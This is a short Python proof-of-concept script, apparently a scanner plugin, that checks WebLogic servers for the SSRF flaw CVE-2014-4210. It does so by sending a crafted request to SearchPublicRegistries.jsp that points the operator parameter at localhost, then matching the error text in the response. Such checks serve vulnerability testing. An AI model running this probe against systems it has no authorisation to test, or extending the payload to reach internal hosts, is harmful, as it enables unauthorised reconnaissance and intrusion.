#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic SSRF漏洞(CVE-2014-4210)
referer: http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html
author: Lucifer
description: weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞
'''
import sys
import warnings
import requests


class ssrf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['weblogic SSRF漏洞(CVE-2014-4210)', '', '']
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and r"IO Exception on sendMessage" not in req.text:
                result[2] = '存在'
                result[1 ]=vulnurl
            else:
                result[2] = '不存在'
        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = ssrf_BaseVerify(sys.argv[1])
    testVuln.run()
